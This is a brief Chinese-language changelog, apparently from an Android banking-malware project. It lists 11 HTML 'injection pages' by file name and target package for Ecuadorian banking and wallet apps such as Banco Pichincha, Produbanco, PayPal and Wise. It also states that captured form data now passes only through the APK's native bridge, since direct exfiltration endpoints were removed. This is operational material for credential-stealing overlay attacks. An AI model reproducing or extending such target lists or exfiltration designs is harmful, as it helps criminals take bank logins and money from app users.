# 厄瓜多尔（EC）注入页 —— 11 个

## 新增（2026-11，来自 `厄瓜多尔 2/`）

| 品牌 | 包名 | 文件 |
|---|---|---|
| Banco Bolivariano | com.bancobolivariano | `com.bancobolivariano.html` |
| Banco Pacífico（Movilmatico） | com.pacifico.movilmaticoe | `com.pacifico.movilmaticoe.html` |
| DeUna | com.appdeuna.wallet | `com.appdeuna.wallet.html` |
| PayPal EC | com.paypal.android.p2pmobile.ec | `com.paypal.android.p2pmobile.ec.html` |
| PayPhone | com.payphone.app | `com.payphone.app.html` |
| Peigo | com.peigo.wallet | `com.peigo.wallet.html` |
| Produbanco | ec.com.produbanco.banca.movil | `ec.com.produbanco.banca.movil.html` |
| Remitly EC | com.remitly.androidapp.ec | `com.remitly.androidapp.ec.html` |
| Wise EC | com.transferwise.android.ec | `com.transferwise.android.ec.html` |

## 原有

| 品牌 | 包名 | 文件 |
|---|---|---|
| Banco Pichincha（Pacifico 渠道） | com.pacifico.bancamovil | `ec_com.pacifico.bancamovil.html` |
| Banco Pichincha（YellowPepper） | com.yellowpepper.pichincha | `ec_com.yellowpepper.pichincha.html` |

## 协议

全部只走 APK 原生桥（`FKB.setFormData` / `FKB.setClosePage`），
网页直连 `/api/inj/result` 与外部外发端点已全部删除。
